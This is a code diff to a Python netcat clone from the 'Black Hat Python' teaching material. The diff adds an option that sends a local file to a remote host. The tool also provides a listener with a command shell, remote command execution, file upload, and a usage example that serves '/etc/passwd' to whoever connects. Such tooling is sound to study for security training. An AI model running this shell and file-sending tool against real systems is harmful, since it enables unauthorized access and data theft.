@@ -15,6 +15,7 @@ COMMAND = False
 EXECUTE = ''
 TARGET = ''
 UPLOAD_DESTINATION = ''
+FILE_ADDR = ''
 PORT = 0
 
 def usage():
@@ -22,13 +23,14 @@ def usage():
         'Black Hat Python\'s Network Tool\n\n'
         'Usage: nc.py -t target_host -p port\n'
         '-l --listen\t\tlisten on [host]:[port] for connections\n'
-        '-e --execute=file\texecute a given file upon connecting\n'
+        '-e --execute=command\texecute a given command upon connecting\n'
         '-c --commandshell\t\tinitialize a command shell\n'
+        '-s --send=file\tsends a file to a remote server'
         '-u --upload=dest\tupon receiving connection upload a file'
         ' and write to [dest]\n\n'
         'Examples:\n\n'
         'nc.py -t 192.168.0.1 -p 5555 -l -c\n'
-        "nc.py -t 192.168.0.1 -p 5555 -l -u 'c:\\target.exe\n'"
+        "nc.py -t 192.168.0.1 -p 5555 -l -u 'c:\\target.exe'\n"
         "nc.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"\n"
         "echo 'ABCDEFGHI' | ./nc.py -t 192.168.11.12 -p 135\n"
     )
@@ -36,14 +38,14 @@ def usage():
     sys.exit(0)
 
 def main():
-    global COMMAND, EXECUTE, LISTEN, PORT, TARGET, UPLOAD_DESTINATION
+    global COMMAND, EXECUTE, FILE_ADDR, LISTEN, PORT, TARGET, UPLOAD_DESTINATION
     if len(sys.argv[1:]) < 1:
         usage()
     try:
-        short = 'hle:t:p:cu:'
+        short = 'hle:t:p:cs:u:'
         long = [
             'help', 'listen', 'execute=', 'target=', 'port=', 'commandshell',
-            'upload='
+            'send=', 'upload='
         ]
         optlist, arglist = getopt.getopt(sys.argv[1:], short, long)
     except getopt.GetoptError as e:
@@ -63,26 +65,38 @@ def main():
             TARGET = arg
         elif opt in ['-p', '--port']:
             PORT = int(arg)
+        elif opt in ['-s', '--send']:
+            FILE_ADDR = arg
         elif opt in ['-u', '--upload']:
             UPLOAD_DESTINATION = arg
-    
+
     if (not LISTEN) and len(TARGET) and PORT > 0:
         buffer = ''
         if not os.isatty(0):
             buffer = sys.stdin.read()
+        elif FILE_ADDR:
+            descriptor = open(FILE_ADDR, 'rb')
+            buffer = descriptor.read()
+            descriptor.close()
         client_sender(buffer)
     
-    if LISTEN:
+    elif LISTEN:
         server_loop()
 
-def client_sender(buffer: str):
-    global PORT, TARGET
+def client_sender(buffer):
+    global FILE_ADDR, PORT, TARGET
     # TODO: Add IPv6 Support
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
         client.connect((TARGET, PORT))
+        print("[*] Connected to %s:%i" % ((TARGET, PORT)))
         if len(buffer):
+            if FILE_ADDR:
+                print("Sending %i bytes to %s:%i" % (len(buffer), TARGET, PORT))
+                client.send(buffer)
+                client.close()
+                sys.exit(0)
             client.send(buffer.encode('UTF-8'))
 
         while True:
@@ -135,9 +149,14 @@ def client_handler(client: socket.socket):
             descriptor = open(UPLOAD_DESTINATION, 'wb')
             descriptor.write(file_buffer)
             descriptor.close()
+            m = "%i bytes writen to %s" % (len(file_buffer), UPLOAD_DESTINATION)
+            print(m)
         except Exception as err:
-            client.send(b'[!] Failed to save file\r\n')
-            client.send(str(err).encode('UTF-8'))
+            m = '[!] Failed to save file to %s\r\n' % UPLOAD_DESTINATION
+            print(m)
+        
+        client.close()
+        sys.exit(0)
     
     if EXECUTE:
         output = run_command(EXECUTE)
@@ -163,7 +182,6 @@ def run_command(cmd: str):
     except Exception as err:
         output = b"[!] Command failed to execute.\r\n"
         output += str(err).encode('UTF-8')
-
     
     return output
 
